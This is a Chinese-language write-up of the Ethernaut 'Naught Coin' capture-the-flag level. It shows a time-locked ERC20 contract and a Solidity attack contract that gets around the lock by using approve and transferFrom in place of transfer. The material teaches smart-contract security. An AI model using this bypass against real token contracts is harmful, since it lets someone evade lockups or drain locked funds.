# 15 - Naught Coin

## 题目
攻击以下合约
```solidity
NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。

  这可能有用

ERC20标准
OpenZeppelin仓库
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

## 解题
本题考察点：
1. erc20除了 transfer 还有 通过 approve 的方式发送代币的途径
攻击合约如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface NaughtCoin {
    function approve(address _spender, uint256 _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external  returns (bool success);
    function transfer(address _to, uint256 _value) external returns (bool) ;
}

contract attact_Naught {
    NaughtCoin NCcoin;
    constructor(address addr) {
        NCcoin = NaughtCoin(addr);
    }

    function attack() external returns(bool) {
        bool succ = NCcoin.transferFrom(address(msg.sender), address(this), 1000000 * (10 ** 18));
        return succ;
    }
    
    
}
```

调用 attack() 前需要先在 NaughtCoin 合约中使用player 账号调用 approve 授权给攻击合约代币额度，
然后调用攻击合约 attack() 即可完成攻击
